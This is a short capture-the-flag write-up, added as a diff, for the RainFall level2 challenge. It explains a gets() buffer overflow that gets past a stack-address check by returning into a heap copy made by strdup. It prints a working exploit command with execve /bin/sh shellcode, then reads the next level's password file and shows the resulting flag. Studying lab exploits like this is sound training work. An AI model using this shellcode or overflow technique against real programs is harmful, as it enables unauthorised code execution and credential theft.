@@ -1,0 +1,24 @@
+As in level 1, gets() is used, which is vulnerable to a buffer overflow attack, but this time a condition checks that the EIP does not point to the stack : 
+
+   0x080484fb <+39>:    and    eax,0xb0000000
+   0x08048500 <+44>:    cmp    eax,0xb0000000
+
+However the program used strdup, and the latter uses the heap, we will therefore overwrite the eip with the heap address, there we will find our shellcode
+
+
+with ltrace ./level2(& GDB), we know that strdump will copy in 0x804a008
+we just have to do our payload :
+
+
+level2@RainFall:~$ (python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 52 + "\x08\xa0\x04\x08"' ; cat) | ./level2
+1?Ph//shh/bin????°
+                  ̀1?@̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
+
+
+
+Source Shell code :
+https://shell-storm.org/shellcode/files/shellcode-811.html
+
